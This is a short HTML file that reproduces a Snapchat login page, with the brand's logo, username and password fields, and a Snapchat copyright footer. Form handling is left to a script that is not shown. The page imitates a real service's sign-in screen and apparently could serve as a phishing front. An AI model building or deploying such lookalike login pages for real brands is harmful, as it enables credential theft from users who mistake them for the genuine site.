<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snapchat Login</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body class="login-page">
  <div class="login-container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" alt="Snapchat Logo" />
    </div>
    <h2>Login to Snapchat</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username or Email" required autocomplete="username" />
      <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
      <button type="submit">Log In</button>
    </form>
    <div class="footer">Â© 2025 Snapchat</div>
  </div>

  <script src="index.js"></script>
</body>
</html>
